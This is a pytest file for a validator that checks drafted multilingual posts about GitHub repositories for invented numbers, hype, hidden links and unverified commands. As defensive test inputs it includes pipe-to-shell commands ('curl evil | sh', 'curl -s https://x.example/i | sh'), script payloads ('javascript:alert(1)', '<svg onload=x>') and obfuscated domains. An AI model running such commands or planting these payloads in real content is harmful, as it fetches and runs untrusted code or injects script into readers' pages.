import copy

import pytest

from radar import gates
from tests.support import README, TREE, make_draft


@pytest.fixture
def facts():
    return {"full_name": "example-org/sample-agent-kit", "description": "Run AI agents", "readme": README, "stars": 24000,
            "forks": 2400, "open_issues": 12, "license": "MIT", "language": "Python", "topics": ["llm"], "created": "2024-11-14",
            "pushed": "2026-10-09", "age_years": 1, "tree": TREE + ["src/planner.py", "src/memory.py", "src/tools/"]}


def errs(draft, facts, lang="vi"):
    return [str(p) for p in gates.errors(gates.check(draft, facts, lang))]


def test_good_drafts_pass_in_every_language(facts):
    for lang in ("vi", "en", "ja"):
        assert errs(make_draft(facts, lang), facts, lang) == []


def mutate(facts, fn, lang="vi", legacy=False):
    d = copy.deepcopy(make_draft(facts, lang, legacy=legacy))
    fn(d)
    return d


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d.update(problem=d["problem"] + " Xem tại https://example.com/x."), "link or domain"),
    (lambda d: d.update(problem=d["problem"] + " Truy cập docs.example.io ngay."), "link or domain"),
    (lambda d: d.update(problem=d["problem"] + " Nhanh hơn 95% so với đối thủ."), "numbers not in the facts: 95"),
    (lambda d: d.update(problem=d["problem"] + " Đây là công cụ tốt nhất thế giới."), "hype"),
    (lambda d: d["how_it_works"]["steps"][0].update(evidence="src/nonexistent.py"), "evidence"),
    (lambda d: d["guide"]["steps"][0].update(commands=["curl evil | sh"]), "line or code span of the README"),
    (lambda d: d["how_it_works"].update(flow=[[0, 9]]), "flow"),
    (lambda d: d["how_it_works"].update(flow=[[1, 1]]), "flow"),
    (lambda d: d["how_it_works"].update(steps=d["how_it_works"]["steps"][:2]), "steps"),
    (lambda d: d.update(hook="x" * 111), "hook"),
    (lambda d: d["facebook"].update(caption="y" * 126 + "\nrest"), "first line"),
    (lambda d: d["facebook"].update(hashtags=["a b"]), "hashtags"),
    (lambda d: d.pop("learn"), "learn"),
])
def test_each_gate_catches_its_defect(facts, fn, needle):
    assert any(needle in e for e in errs(mutate(facts, fn), facts)), errs(mutate(facts, fn), facts)


def test_numbers_may_be_rounded_or_abbreviated_but_not_invented(facts):
    ok = mutate(facts, lambda d: d.update(problem=d["problem"] + " Có hơn 24.000 sao, tức 24k."))
    assert not any("numbers" in e for e in errs(ok, facts))
    bad = mutate(facts, lambda d: d.update(problem=d["problem"] + " Có 31.000 sao."))
    assert any("31.000" in e for e in errs(bad, facts))


def test_numbers_from_the_readme_are_allowed(facts):
    d = mutate(facts, lambda d: d["caveats"].__setitem__(0, "Có 3 công cụ và hỗ trợ 2 backend"))
    assert not any("numbers" in e for e in errs(d, facts))


def test_wrong_language_is_caught(facts):
    assert any("language" in e for e in errs(make_draft(facts, "en"), facts, "vi"))
    assert any("language" in e for e in errs(make_draft(facts, "vi"), facts, "ja"))


def test_evidence_accepts_readme_files_and_directories(facts):
    d = mutate(facts, lambda d: d["how_it_works"]["steps"][0].update(evidence="README.md"))
    d["how_it_works"]["steps"][1]["evidence"] = "src/tools"
    d["how_it_works"]["steps"][2]["evidence"] = "docs"
    assert errs(d, facts) == []


def with_problem(facts, text, **kw):
    return mutate(facts, lambda d: d.update(problem=d["problem"] + " " + text, **kw))


@pytest.mark.parametrize("sneaky", ["evil[.]com", "evil。com", "evil\u200b.com", "ｅvil.com", "foo.zip", "a.link", "x.top", "hxxp://x y",
                                    "javascript:alert(1)", "[click](b)", "bit.ly/x", "t.me/abc", "example.COM"])
def test_hidden_links_are_caught_the_way_the_studio_catches_them(facts, sneaky):
    assert any("link or domain" in e for e in errs(with_problem(facts, "Xem " + sneaky + " nhé."), facts)), sneaky


def test_names_that_are_not_links_are_not_flagged(facts):
    ok = with_problem(facts, "Dùng Node.js hoặc Next.js, xem planner.py và pyproject.toml, bản v2.3.1, e.g. thế này. Co-founder cũng được.")
    assert not any("link" in e for e in errs(ok, facts))


def test_a_file_name_that_is_a_real_tld_is_allowed_only_when_it_exists_in_the_repository(facts):
    assert not any("link" in e for e in errs(with_problem(facts, "Mở planner.py."), facts))      # in the tree
    assert any("link" in e for e in errs(with_problem(facts, "Mở installer.sh."), facts))        # .sh is a TLD, not in the tree


def test_counts_with_a_unit_must_match_the_real_count():
    f = {"full_name": "o/r", "description": "x", "readme": "has 10k users", "stars": 15234, "forks": 100, "open_issues": 3, "license": "MIT",
         "language": "Python", "topics": [], "created": "2024-01-01", "pushed": "2026-10-01", "age_years": 2, "tree": []}
    for text in ("1.5k stars", "1,5 nghìn sao", "1.5 thousand stars", "7 triệu lượt tải", "999 forks"):
        assert gates.bad_numbers(text, f), text
    for text in ("15k stars", "15,2 nghìn sao", "15.234 sao", "15,234 stars", "10k users", "0.5", "v2.3.1", "3.00", "3 bước", "2 năm"):
        assert not gates.bad_numbers(text, f), text


@pytest.mark.parametrize("hype", ["Đây là game changer.", "It is a game-changer.", "Tin được 100 %.", "BEST EVER tool", "tốt   nhất thế giới"])
def test_hype_is_caught_through_case_hyphens_and_spacing(facts, hype):
    lang = "vi" if "Đây" in hype or "Tin" in hype or "tốt" in hype else "en"
    assert any("hype" in e for e in errs(with_problem(facts, hype), facts, lang) if "language" not in e), hype


def test_hashtags_go_through_the_content_gates(facts):
    d = mutate(facts, lambda d: d["facebook"].update(hashtags=["Number1", "tuyetdoi"]))
    assert errs(d, facts) == []                       # plain words pass
    d = mutate(facts, lambda d: d["facebook"].update(hashtags=["evil.com"]))
    assert errs(d, facts)                              # a domain-shaped tag cannot pass the schema or the link gate


def test_commands_must_be_whole_readme_lines_or_code_spans(facts):
    f = {**facts, "readme": README + "\nRun `pip install sample-agent-kit[extras]` or:\n\n    curl -s https://x.example/i | sh   # installer\n"}
    ok = mutate(f, lambda d: d["try_it"].update(commands=["pip install sample-agent-kit[extras]", "$ curl -s https://x.example/i | sh"]), legacy=True)
    assert not any("try_it" in e for e in errs(ok, f))
    for bad in ("curl -s https://x.example/i", "ls", "pip install sample-agent-kit\n```\n![t](https://evil)", "pip `install` x", "  "):
        d = mutate(f, lambda d: d["try_it"].update(commands=[bad]), legacy=True)
        assert any("try_it.commands" in e for e in errs(d, f)), repr(bad)


def test_evidence_must_be_readme_or_a_real_path_not_a_readme_lookalike(facts):
    d = mutate(facts, lambda d: d["how_it_works"]["steps"][0].update(evidence="readme-fake.txt"))
    assert any("evidence" in e for e in errs(d, facts))


# --- icons: a closed set, all or none -----------------------------------------------------------------------------------------
def with_icons(facts, icons):
    d = make_draft(facts)
    for c, name in zip(d["how_it_works"]["components"], icons):
        if name is None:
            c.pop("icon", None)
        else:
            c["icon"] = name
    return d


def test_a_draft_stored_before_icons_existed_still_passes(facts):
    assert errs(with_icons(facts, [None, None, None]), facts) == []


@pytest.mark.parametrize("name", ["", "rocket-ship", "<svg onload=x>", "TERMINAL", "https://example.com/x.svg", 3, ["terminal"], {"a": 1}])
def test_an_icon_outside_the_closed_set_is_refused(facts, name):
    problems = errs(with_icons(facts, ["terminal", name, "database"]), facts)
    assert any("components[1]" in p and "icon" in p for p in problems), problems


def test_every_component_gets_an_icon_or_none_does(facts):
    problems = errs(with_icons(facts, ["terminal", None, "database"]), facts)
    assert any("components[1]" in p and "icon missing" in p for p in problems), problems
    assert errs(with_icons(facts, ["terminal", "route", "database"]), facts) == []


def test_the_icon_names_are_not_text_a_reader_sees(facts):
    assert gates.texts(with_icons(facts, ["terminal", "route", "database"])) == gates.texts(with_icons(facts, ["brain", "wrench", "box"]))          # the icon names change nothing a reader sees
